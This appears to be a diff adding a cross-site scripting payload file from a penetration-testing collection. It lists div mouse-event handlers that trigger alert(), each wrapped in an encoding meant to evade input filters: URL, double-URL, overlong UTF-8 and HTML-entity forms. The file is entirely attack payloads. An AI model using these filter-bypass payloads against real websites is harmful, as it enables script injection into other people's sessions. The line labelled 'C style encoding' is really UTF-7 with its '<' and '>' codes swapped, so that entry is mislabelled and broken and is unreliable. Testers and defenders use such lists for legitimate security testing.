@@ -1,0 +1,16 @@
+// Create an alert (could also reference a function defined elsewhere) upon mouse event on a div
+
+  <div onmouseenter=alert(1)>1</div>
+  /* use URL encoding for < and > */                     %3Cdiv onmouseenter=alert(1)%3E1%3C/div%3E
+  /* use double URL encoding for < and > */              %253Cdiv onmouseenter=alert(1)%253E1%253C/div%253E
+  /* use bad UTF-8 encoding for < and > */               %c0%bcdiv onmouseenter=alert(1)%c0%be1%c0%bc/div%c0%be
+  /* use HTML &-encoding for < and > */                  %26lt;div onmouseenter=alert(1)%26gt;1%26lt;/div%26gt;
+  /* use double &-encoding for < and > */                %26amp;lt;div onmouseenter=alert(1)%26amp;gt;1%26amp;lt;/div%26amp;gt;
+  /* use C style encoding for < and > */                 +AD4-div onmouseenter=alert(1)+ADw-1+AD4-/div+ADw-
+  
+  
+  // Related mouse events
+  
+      <div onmousemove=alert(2)>2</div>
+      <div onmouseover=alert(3)>3</div>
+  
